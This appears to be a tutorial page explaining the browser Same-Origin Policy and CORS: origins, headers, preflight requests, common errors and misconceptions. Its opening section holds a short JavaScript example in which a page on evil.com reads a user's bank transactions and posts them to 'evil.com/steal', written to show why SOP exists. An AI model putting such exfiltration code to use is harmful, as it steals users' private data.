1 The Problem · Same-Origin Policy

CORS exists because of the Same-Origin Policy (SOP) — a browser security mechanism that blocks a web page from making requests to a different origin than the one that served the page. CORS is the escape hatch that lets servers opt in to cross-origin requests.

What is an "origin"?

// Origin = scheme + host + port https://api.example.com:443 ├─ scheme: https ├─ host: api.example.com └─ port: 443
If any of these differ → cross-origin

😈 The Attack That Would Be Possible

Step 1: You visit evil.com in your browser while logged into bank.com

// Malicious page on evil.com: fetch('https://bank.com/api/transactions') .then(function(res) { // WITHOUT SOP, this works! return res.json(); }) .then(function(data) { // Send stolen data to attacker fetch('https://evil.com/steal', { method: 'POST', body: JSON.stringify(data) }); });

Step 2: Evil.com reads your bank transactions

Why this works without SOP: The browser auto-attaches cookies for bank.com. The server sees a valid session and returns your data. Evil.com reads the response.
Why SOP/CORS blocks this: The browser sees the response is cross-origin (evil.com → bank.com) and prevents evil.com's JavaScript from reading the response. The request goes through, but JS cannot access the data.
3 What CORS Actually Does

✓ CORS allows

A server to explicitly say: "I trust this other origin — let them read my response."

myapp.com
→
api.example.com
→
✓ Response shared
ⓘ CORS is server-driven. The server decides which origins are allowed by sending specific HTTP headers. The browser enforces this decision.

✗ CORS does NOT

  • Block the request from being sent
  • Encrypt the request/response
  • Authenticate the user
  • Replace server-side auth
  • Protect against server-to-server attacks
⚠ The request still reaches the server! SOP only prevents JS from reading the response. Side effects (POST, DELETE) still happen.

6 CORS Headers Reference
HeaderDirectionWhat it doesExample
Access-Control-Allow-Origin ← Response Which origins can read the response. * allows all. https://myapp.com
Access-Control-Allow-Methods ← Response (preflight) Which HTTP methods are allowed cross-origin. GET, POST, PUT
Access-Control-Allow-Headers ← Response (preflight) Which custom headers are allowed. X-API-Key, Authorization
Access-Control-Allow-Credentials ← Response Whether cookies can be sent cross-origin. If true, Allow-Origin cannot be *. true
Access-Control-Expose-Headers ← Response Which response headers JS can read (beyond the default 6 simple headers). X-Total-Count
Access-Control-Max-Age ← Response (preflight) How long (seconds) to cache the preflight result. 86400
Origin → Request Sent by the browser — tells server where the request came from. https://myapp.com
7 Simple vs Preflight Requests

✓ Simple Request (no preflight)

Must meet ALL of these:

  • Method: GET, HEAD, or POST
  • Content-Type: application/x-www-form-urlencoded, multipart/form-data, or text/plain
  • No custom headers (only browser-set ones like Accept, Accept-Language)
  • No event listeners on the upload
  • Readable response body is not ReadableStream
Browser sends the request directly. If response has Access-Control-Allow-Origin matching the origin, JS can read it.

⚠ Preflight Request

Triggers an OPTIONS preflight if:

  • Method: PUT, DELETE, PATCH, etc.
  • Content-Type: application/json, text/xml, etc.
  • Custom headers: Authorization, X-*, etc.
  • Credentials: with credentials: 'include'
Browser sends OPTIONS first. Server must respond with matching Allow-Origin, Allow-Methods, Allow-Headers. Only then does the browser send the real request.
8 Common CORS Scenarios

▶ Frontend calls API on different domain

// React app on https://myapp.com // calls https://api.example.com fetch('https://api.example.com/users') .then(r => r.json()) .then(data => console.log(data)); // ❌ CORS error without proper headers!

Fix: Server adds Access-Control-Allow-Origin: https://myapp.com

▶ Using credentials (cookies)

// Sending cookies cross-origin: fetch('https://api.example.com/me', { credentials: 'include' }).then(r => r.json());

Fix: Server must send both:
Access-Control-Allow-Credentials: true
Access-Control-Allow-Origin: https://myapp.com
Cannot use * for Allow-Origin!

▶ Custom headers (Authorization)

fetch('https://api.example.com/protected', { headers: { 'Authorization': 'Bearer eyJ...' } });

Fix: Preflight required. Server must include Authorization in Access-Control-Allow-Headers.

▶ Public API (allow all origins)

// Server response for public API: Access-Control-Allow-Origin: * Access-Control-Allow-Methods: GET

Use * only for public data. Cannot use with credentials.

9 CORS Errors · Visualized

Here's what the browser actually tells you when CORS blocks a request.

⚠
CORS error (no header):
Access to fetch at 'https://api.example.com/data'
from origin 'https://myapp.com' has been blocked
by CORS policy: No 'Access-Control-Allow-Origin'
header is present on the requested resource.
→ The request went through (server processed it)
→ The response came back with data
→ Browser saw no CORS header
→ Browser threw away the response from JS perspective
⚠
CORS error (origin mismatch):
Access to fetch at 'https://api.example.com/data'
from origin 'https://myapp.com' has been blocked
by CORS policy: The 'Access-Control-Allow-Origin'
header has a value 'https://otherapp.com'
which is not equal to the supplied origin.
→ Server sent CORS header
→ But for a different origin than your app
→ Browser rejects it
10 Common Misconceptions
"CORS protects my API"
❌ False. CORS is browser-only. curl, Postman, mobile apps, server-to-server requests are never blocked by CORS. Your API still needs proper authentication.
"I can fix CORS by adding a proxy"
✓ True but... A proxy (e.g., CORS proxy or your own backend) works by making the request server-to-server (not subject to CORS), then your frontend calls the proxy which is same-origin. This is a valid workaround but adds latency.
"mode: 'no-cors' bypasses CORS"
❌ Partial truth. no-cors means the request is sent but you cannot read the response (response type is opaque). Useful for analytics pings, useless for data fetching.
"Access-Control-Allow-Origin: * is fine for everything"
❌ Only for public data. If you send cookies (credentials: 'include'), * is not allowed — you must specify an exact origin.
